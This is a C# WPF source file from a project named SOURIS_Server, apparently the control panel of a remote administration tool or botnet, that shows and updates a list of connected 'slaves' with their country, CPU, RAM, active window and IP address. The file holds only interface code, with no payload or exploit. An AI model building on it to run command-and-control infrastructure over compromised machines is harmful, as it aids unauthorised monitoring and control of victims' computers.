using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace SOURIS_Server.Form
{
    class FormUpdate
    {
        public static void addlistbox(string message)
        {
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listBox.Items.Add(message)));
        }
        public static void startingtask()
        {
            addlistbox(" >> Server Started");
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.ItemsSource = Slaves.SlaveList.List));
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.Items.Refresh()));
        }
        public static void deleteline()
        {
            int intselectedindex = MainWindow.main.listView1.SelectedIndex;
            try
            {
                if (MainWindow.main.listView1.SelectedItems.Count > 0)
                {
                    int selected = MainWindow.main.listView1.SelectedIndex;
                    Slaves.SlaveList.List.RemoveAt(selected);
                    MainWindow.main.listView1.Items.Refresh();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        internal static void updateSlave(string content)
        {
            string[] SlaveContent = content.Split('|');
            int count = 0;
            bool updated = false;
            for (int i = 0; i < Slaves.SlaveList.List.Count; i++)
            {
                if (Slaves.SlaveList.List[i].Name.Contains(SlaveContent[0]))
                {
                    updated = true;
                    Slaves.SlaveList.List[i].Name = SlaveContent[0];
                    Slaves.SlaveList.List[i].Country = SlaveContent[1];
                    Slaves.SlaveList.List[i].Ping = SlaveContent[2];
                    Slaves.SlaveList.List[i].CPU = SlaveContent[3];
                    Slaves.SlaveList.List[i].RAM = SlaveContent[4];
                    Slaves.SlaveList.List[i].Activity = SlaveContent[5];
                    Slaves.SlaveList.List[i].Front = SlaveContent[6];
                    Slaves.SlaveList.List[i].IP = SlaveContent[7];
                    break;
                }
            }
            if (!updated)
            {
                Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => Slaves.SlaveList.List.Add(new Slaves.SlaveList.Slave { Name = SlaveContent[0], Country = SlaveContent[1], Ping = SlaveContent[2], CPU = SlaveContent[3], RAM = SlaveContent[4], Activity = SlaveContent[5], Front = SlaveContent[6], IP = SlaveContent[7] }) ));
            }
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => MainWindow.main.listView1.Items.Refresh()));
        }
    }
}
